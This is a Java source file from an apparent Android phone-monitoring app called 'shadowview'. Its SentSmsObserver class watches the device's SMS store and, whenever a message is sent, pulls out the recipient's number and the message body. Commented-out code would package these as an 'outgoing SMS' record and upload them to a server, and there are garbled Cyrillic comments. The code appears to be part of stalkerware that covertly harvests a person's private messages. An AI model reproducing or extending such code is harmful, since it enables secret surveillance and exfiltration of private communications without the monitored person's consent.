package com.shadiz.usergin.shadowview.receiver.message;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.shadiz.usergin.shadowview.utils.Logger;
import com.shadiz.usergin.shadowview.utils.Preferences;
import com.shadiz.usergin.shadowview.utils.WorkTimeDefiner;

import javax.inject.Inject;

/**
 * Created by oldman on 31.10.16.
 */

public class SentSmsObserver  extends ContentObserver {

    private static final String TAG = "SMSTSentObserver";
    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private static long id = 0;
    private Handler handler;

    @Inject
    Context context;
    @Inject
    Preferences preferences;

    public SentSmsObserver(Handler handler) {
        super(handler);
    }


    public boolean deliverSelfNotifications() {
        return true;
    }

    public void onChange(boolean selfChange) {
        try {
            Logger.doLog(TAG, "Notification on SMS observer", "Notification on SMS observer");
            if (WorkTimeDefiner.isDoWork() || preferences.getSms() != 0)
                return;
            Cursor sms_sent_cursor = context.getContentResolver().query(STATUS_URI, null, null, null, null);
            if (sms_sent_cursor != null) {
                if (sms_sent_cursor.moveToFirst()) {
                    String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));

                    Logger.doLog(TAG, "protocol : " + protocol, "protocol : " + protocol);

                    if (protocol == null) {
                        // String[] colNames = sms_sent_cursor.getColumnNames();
                        int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));

                        Logger.doLog(TAG, "SMS Type : " + type, "SMS Type : " + type);

                        if (type == 2) {
                            long messageId = sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("_id"));
                            // ïðîâåðÿåì íå îáðàáàòûâàëè ëè ìû ýòî ñîîáùåíèå
                            // òîëüêî-÷òî
                            if (messageId != id) {
                                id = messageId;
                                int threadId = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("thread_id"));
                                Cursor c = context.getContentResolver()
                                        .query(Uri.parse("content://sms/outbox/" + threadId), null, null, null, null);
                                c.moveToNext();
                                String phNumber = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"));
                                String message = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"));

                                sms_sent_cursor.close();
                                // -------send sms----------------------------
//                                Map<String, Object> sms = new HashMap<String, Object>();
//                                Map<String, String> info = new HashMap<String, String>();
//                                sms.put("type", AppConstants.TYPE_OUTGOING_SMS_REQUEST);
//                                sms.put("time", ConvertDate.logTime());
//                                info.put("number", phNumber);
//                                info.put("data", message);
//                                sms.put("info", info);
//
//                                RequestList.sendDataRequest(sms, null, mContext);
                            }
                        }
                    }
                }
            } else

                Logger.doLog(TAG, "smsSentObserver: Send Cursor is Empty", "smsSentObserver: Send Cursor is Empty");
        } catch (Exception sggh) {
            Logger.doLog(TAG, "Error on onChange : " + sggh.toString(), "Error on onChange : " + sggh.toString());
        }
        super.onChange(selfChange);
    }
}

